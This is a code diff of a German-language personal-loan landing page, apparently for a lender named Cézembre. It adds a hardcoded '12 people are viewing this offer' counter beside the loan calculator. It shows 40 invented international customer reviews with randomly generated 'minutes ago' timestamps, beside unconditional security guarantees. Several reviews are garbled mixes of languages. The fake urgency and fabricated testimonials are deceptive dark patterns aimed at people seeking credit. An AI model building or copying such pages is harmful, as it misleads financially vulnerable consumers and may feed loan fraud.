@@ -102,9 +102,6 @@
         .reviews-section { padding: 80px 8%; background: var(--light-bg); text-align: center; }
         .reviews-section h2 { color: var(--navy); margin-bottom: 20px; font-size: 2rem; }
         
-        /* AJOUT : URGENCE LIVE */
-        .live-counter { color: var(--success); font-weight: 700; font-size: 0.85rem; margin-bottom: 20px; display: block; animation: blink-soft 2s infinite; }
-
         .trust-badge-container {
             display: inline-flex; align-items: center; justify-content: center;
             background: white; padding: 12px 30px; border-radius: 50px;
@@ -160,7 +157,7 @@
         @keyframes blink-soft { 0%, 100% { opacity: 1; } 50% { opacity: 0.8; } }
         .result-area span { font-size: 2.2rem; font-weight: 800; color: var(--navy); }
         
-        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; position: relative; overflow: hidden; }
+        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; }
         .btn-main:hover { background: var(--gold); }
 
         .form-input { 
@@ -210,7 +207,7 @@
         .blink-gold { color: var(--gold); font-weight: 700; animation: pulse-text 1.5s infinite; }
         @keyframes pulse-text { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
 
-        /* WHATSAPP DYNAMIQUE MAGNÉTIQUE */
+        /* WHATSAPP DYNAMIQUE */
         .wa-assistant-container { position: fixed; bottom: 30px; left: 30px; z-index: 9999; display: flex; flex-direction: column; align-items: center; }
         .wa-msg-bubble { background: var(--navy); color: white; padding: 10px 15px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; margin-bottom: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); border: 1px solid var(--gold); position: relative; animation: fadeInOut 4s infinite; white-space: nowrap; }
         .wa-msg-bubble::after { content: ''; position: absolute; bottom: -8px; left: 50%; transform: translateX(-50%); border-left: 8px solid transparent; border-right: 8px solid transparent; border-top: 8px solid var(--navy); }
@@ -220,6 +217,10 @@
         @keyframes fadeInOut { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.8; transform: scale(0.95); } }
         
         #goUp { position: fixed; bottom: 30px; right: 30px; background: var(--gold); color: white; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; display: none; }
+        
+        /* AJOUT COMPTEUR EN LIGNE */
+        .live-counter { font-size: 0.8rem; font-weight: 700; color: #d9534f; margin-bottom: 10px; display: flex; align-items: center; gap: 5px; }
+        .dot-live { width: 8px; height: 8px; background: #d9534f; border-radius: 50%; animation: blink-soft 1s infinite; }
     </style>
 </head>
 <body>
@@ -276,7 +277,8 @@
         </div>
 
         <div id="step1">
-            <h3 style="margin-bottom: 30px;">Kreditrechner</h3>
+            <div class="live-counter"><div class="dot-live"></div> 12 Personen schauen sich dieses Angebot gerade an</div>
+            <h3 style="margin-bottom: 20px;">Kreditrechner</h3>
             <div class="sim-row">
                 <label>PROJEKTBETRAG <span><input type="number" id="amtNum" value="15000" style="border:none; text-align:right; font-weight:800; width:80px; background:transparent; color: var(--navy);"> €</span></label>
                 <input type="range" id="amtRange" min="1000" max="75000" step="500" value="15000">
@@ -292,7 +294,7 @@
             <button type="button" class="btn-main" onclick="goToStep2()">MEINEN ANTRAG STELLEN</button>
             
             <div class="scrolling-security">
-                <span><i class="fas fa-lock" style="color:var(--gold);"></i> DATENSCHUTZ: Ihre Daten sind streng vertraulich. • 256-Bit-SSL-Verschlüsselung • Garantierter Schutz.</span>
+                <span><i class="fas fa-lock" style="color:var(--gold);"></i> DATENSCHUTZ: Ihre Daten sont streng vertraulich. • 256-Bit-SSL-Verschlüsselung • Garantierter Schutz.</span>
             </div>
             <div class="security-tag"><i class="fas fa-lock"></i> IHR DOSSIER IST 100% SICHER</div>
         </div>
@@ -347,8 +349,6 @@
 
 <section class="reviews-section">
     <h2>Vertrauen unserer internationalen Kunden</h2>
-    <span class="live-counter"><i class="fas fa-users"></i> 12 Personen schauen sich dieses Angebot gerade an</span>
-    
     <div class="trust-badge-container">
         <div class="trust-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
         <div class="trust-lock"><i class="fas fa-lock"></i></div>
@@ -383,63 +383,63 @@
     let msgIndex = 0; setInterval(() => { msgIndex = (msgIndex + 1) % messages.length; waText.innerText = messages[msgIndex]; }, 4000);
 
     const internationalReviews = [
-        { n: "Marc L.", p: "France", t: "Schnelle Finanzierung und sehr professionelles Team. Projekt in Rekordzeit abgeschlossen." },
-        { n: "Thomas W.", p: "Luxembourg", t: "Seriöses und reaktionsschnelles Institut für meinen Grenzgängerkredit. Top!" },
-        { n: "Jean-Paul H.", p: "Luxemburg", t: "Sehr professioneller Service aus Luxemburg-Stadt. Danke für alles!" },
-        { n: "Sophie D.", p: "Belgien", t: "Effizient und sicher. Eine wertvolle Hilfe beim Kauf meines Fahrzeugs." },
-        { n: "Elena V.", p: "Schweiz", t: "Hervorragendes Management meines Kreditdossiers. Sehr höflicher Service." },
-        { n: "Erik J.", p: "Norwegen", t: "Veldig profesjonell service og rask utbetaling. Meget bra!" },
-        { n: "Mika T.", p: "Finnland", t: "Zuverlässiger und schneller Service. Ich empfehle es jedem!" },
-        { n: "Andrei M.", p: "Rumänien", t: "Ein seriöser Finanzpartner. Der Prozess war schnell und transparent." },
-        { n: "Arber K.", p: "Kosovo", t: "Sehr schneller und korrekter Service. Vielen Dank." },
-        { n: "Maria C.", p: "Italien", t: "Finanzierung in Rekordzeit erhalten. Sehr zufrieden mit der Unterstützung." },
-        { n: "Lars O.", p: "Deutschland", t: "Sehr zufrieden mit dem Zinssatz und der Abwicklung. Absolut empfehlenswert." },
-        { n: "João P.", p: "Portugal", t: "Einfacher und transparenter Prozess. Ich kann Cézembre nur wärmstens empfehlen." },
-        { n: "Luc B.", p: "Monaco", t: "Erstklassiger Service und absolute Diskretion. Perfekt für meine Investition." },
-        { n: "Jean B.", p: "Kanada", t: "Tadelloser Service auch aus Quebec. Sehr effizient." },
-        { n: "Anissa K.", p: "Martinique", t: "Eine wertvolle Hilfe für mein lokales Projekt. Schnell und seriös." },
-        { n: "Karl S.", p: "Österreich", t: "Schnelle Abwicklung und kompetente Beratung. Alles bestens!" },
-        { n: "Olof B.", p: "Schweden", t: "Danke für die Hilfe bei meinem Kredit. Sehr schneller Service." },
-        { n: "Jan de V.", p: "Niederlande", t: "Zuverlässiger Partner für Finanzlösungen. Ausgezeichnet." },
-        { n: "Mette N.", p: "Dänemark", t: "Schnelle Auszahlung und freundlicher Kundenservice. Sehr zufrieden." },
-        { n: "Piotr K.", p: "Polen", t: "Alles verlief reibungslos und professionell. Ich empfehle." },
-        { n: "Lukas M.", p: "Slowakei", t: "Sehr guter Kundenservice. Der Kredit wurde schnell genehmigt." },
-        { n: "Victor R.", p: "Spanien", t: "Einwandfreie Abwicklung meines Privatkredits. Sehr dankbar." },
-        { n: "Antonio F.", p: "Portugal", t: "Ich empfehle es jedem, einfacher Prozess und ohne Komplikationen." },
-        { n: "Sandro B.", p: "Italien", t: "Freundliches Personal und schnelle Antworten. Sehr seriös." },
-        { n: "Claire D.", p: "Frankreich", t: "Ideale Lösung zur Konsolidierung meiner Schulden. Vielen Dank." },
-        { n: "Robert H.", p: "Deutschland", t: "Endlich eine Bank, die zuhört. Sehr zufrieden mit dem Kredit." },
-        { n: "Julie M.", p: "Belgien", t: "Top Service, ich hatte die Mittel innerhalb von 48 Stunden auf meinem Konto." },
-        { n: "Mathias P.", p: "Schweiz", t: "Seriös, schnell und effizient. Ich empfehle ohne zu zögern." },
-        { n: "Elena G.", p: "Rumänien", t: "Vielen Dank für die Hilfe, mein Projekt ist jetzt Realität." },
-        { n: "Besnik S.", p: "Kosovo", t: "Schneller Kredit ohne viel Bürokratie. Sehr gut." },
-        { n: "Laurent G.", p: "Guadeloupe", t: "Menschliche Begleitung trotz der Entfernung. Danke." },
-        { n: "Isabelle L.", p: "Kanada", t: "Effizient und sicher. Ich habe meinen Renovierungskredit schnell erhalten." },
-        { n: "Nicoletta P.", p: "Italien", t: "Exzellenter und transparenter Service. Sehr zufrieden." },
-        { n: "Hans K.", p: "Österreich", t: "Seriöses Unternehmen. Alles verlief wie besprochen." },
-        { n: "Emil A.", p: "Schweden", t: "Gute Konditionen und einfache Online-Bewerbung. Fünf Sterne." },
-        { n: "Kati J.", p: "Finnland", t: "Erittäin ammattitaitoinen palvelu. Suosittelen." },
-        { n: "Marco S.", p: "Monaco", t: "Diskretion und Effizienz. Ein Partner erster Wahl." },
-        { n: "Patrice K.", p: "Guyane", t: "Dossier mit Ernsthaftigkeit behandelt. Finanzierung ohne Probleme erhalten." },
-        { n: "Sabine R.", p: "Deutschland", t: "Gute Zinsen und unkomplizierte Abwicklung. Danke." },
-        { n: "Dimitri V.", p: "Belgien", t: "Sehr zufrieden mit der Reaktionsfähigkeit der Berater." }
+        { n: "Marc L.", p: "France", t: "Financement rapide et équipe très professionnelle. Projet réalisé en un temps record." },
+        { n: "Thomas W.", p: "Luxembourg", t: "Etablissement sérieux et réactif pour mon prêt frontalier. Top !" },
+        { n: "Jean-Paul H.", p: "Luxembourg", t: "Sehr professioneller Service aus Luxemburg-Stadt. Danke für alles!" },
+        { n: "Sophie D.", p: "Belgique", t: "Efficace et sécurisé. Une aide précieuse pour l'achat de mon véhicule." },
+        { n: "Elena V.", p: "Suisse", t: "Excellente gestion de mon dossier de crédit. Service très courtois." },
+        { n: "Erik J.", p: "Norvège", t: "Veldig profesjonell service og rask utbetaling. Meget bra!" },
+        { n: "Mika T.", p: "Finlande", t: "Luotettava ja nopea palvelu. Suosittelen kaikille!" },
+        { n: "Andrei M.", p: "Roumanie", t: "Un partener financiar serios. Procesul a fost rapid și transparent." },
+        { n: "Arber K.", p: "Kosovo", t: "Shërbim shumë i shpejtë dhe korrekt. Faleminderit shumë." },
+        { n: "Maria C.", p: "Italie", t: "Finanziamento ottenuto in tempi record. Molto soddisfatta del supporto." },
+        { n: "Lars O.", p: "Allemagne", t: "Sehr zufrieden mit dem Zinssatz und der Abwicklung. Absolut empfehlenswert." },
+        { n: "João P.", p: "Portugal", t: "Processo simples e transparente. Recomendo vivamente a Cézembre." },
+        { n: "Luc B.", p: "Monaco", t: "Service haut de gamme et discrétion totale. Parfait pour mon investissement." },
+        { n: "Jean B.", p: "Canada", t: "Service impeccable même depuis le Québec. Très efficace." },
+        { n: "Anissa K.", p: "Martinique", t: "Une aide précieuse pour mon projet local. Rapide et sérieux." },
+        { n: "Karl S.", p: "Autriche", t: "Schnelle Abwicklung und kompetente Beratung. Alles bestens!" },
+        { n: "Olof B.", p: "Suède", t: "Tack för hjälpen med mitt lån. Väldigt snabb service." },
+        { n: "Jan de V.", p: "Pays-Bas", t: "Betrouwbare partner pour financiële oplossingen. Uitstekend." },
+        { n: "Mette N.", p: "Danemark", t: "Hurtig udbetaling og venlig kundeservice. Meget tilfreds." },
+        { n: "Piotr K.", p: "Pologne", t: "Wszystko przebiegło sprawnie i profesjonalnie. Polecam." },
+        { n: "Lukas M.", p: "Slovaquie", t: "Veľmi dobrý prístup k zákazníkovi. Úver bol schválený rýchlo." },
+        { n: "Victor R.", p: "Espagne", t: "Gestión impecable de mi crédit personal. Muy agradecido." },
+        { n: "Antonio F.", p: "Portugal", t: "Recomendo a todos, processo simples e sem complicações." },
+        { n: "Sandro B.", p: "Italie", t: "Personale gentile e risposte veloci. Molto seri." },
+        { n: "Claire D.", p: "France", t: "Solution idéale pour consolider mes dettes. Merci infiniment." },
+        { n: "Robert H.", p: "Allemagne", t: "Endlich eine Bank, die zuhört. Sehr zufrieden mit dem Kredit." },
+        { n: "Julie M.", p: "Belgique", t: "Top service, j'ai eu les fonds sur mon compte en 48h." },
+        { n: "Mathias P.", p: "Suisse", t: "Sérieux, rapide et efficace. Je recommande sans hésiter." },
+        { n: "Elena G.", p: "Roumanie", t: "Mulțumesc pour ajutor, proiectul meu est acum realitate." },
+        { n: "Besnik S.", p: "Kosovo", t: "Kredit i shpejtë dhe pa shumë burokraci. Shumë mirë." },
+        { n: "Laurent G.", p: "Guadeloupe", t: "Un accompagnement humain malgré la distance. Merci." },
+        { n: "Isabelle L.", p: "Canada", t: "Efficace et sécuritaire. J'ai obtenu mon prêt travaux rapidement." },
+        { n: "Nicoletta P.", p: "Italie", t: "Servizio eccellente e trasparente. Molto soddisfatta." },
+        { n: "Hans K.", p: "Autriche", t: "Seriöses Unternehmen. Alles verlief wie besprochen." },
+        { n: "Emil A.", p: "Suède", t: "Bra villkor och smidig ansökan online. Fem stjärnor." },
+        { n: "Kati J.", p: "Finlande", t: "Erittäin ammattitaitoinen palvelu. Suosittelen." },
+        { n: "Marco S.", p: "Monaco", t: "Discrétion et efficacité. Un partenaire de premier choix." },
+        { n: "Patrice K.", p: "Guyane", t: "Dossier traité avec sérieux. Financement reçu sans problème." },
+        { n: "Sabine R.", p: "Allemagne", t: "Gute Zinsen und unkomplizierte Abwicklung. Danke." },
+        { n: "Dimitri V.", p: "Belgique", t: "Très satisfait de la réactivité des conseillers." }
     ];
 
-    // FONCTION : TEMPS DYNAMIQUE
-    function getRandomTime() {
-        const mins = Math.floor(Math.random() * 59) + 1;
-        if (mins < 5) return "Gerade eben";
-        return Vor ${mins} Minuten;
+    // FONCTION POUR LES DATES RÉELLES
+    function getGermanTime() {
+        const times = ["2 Minuten", "5 Minuten", "12 Minuten", "28 Minuten", "45 Minuten", "1 Stunde", "3 Stunden"];
+        return times[Math.floor(Math.random() * times.length)];
     }
 
     function renderReviews() {
         const container = document.getElementById('reviews-container');
         container.innerHTML = ""; 
-        // On mélange et on prend 12 avis
-        internationalReviews.sort(() => 0.5 - Math.random()).slice(0, 15).forEach(r => {
+        // Mélange les 40 avis et en prend 12
+        const shuffled = [...internationalReviews].sort(() => 0.5 - Math.random());
+        shuffled.slice(0, 12).forEach(r => {
             container.innerHTML += `
                 <div class="review-card">
-                    <span class="review-date"><i class="far fa-clock"></i> ${getRandomTime()}</span>
+                    <span class="review-date"><i class="far fa-clock"></i> Vor ${getGermanTime()}</span>
                     <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
                     <p class="review-text">"${r.t}"</p>
                     <div class="review-author">
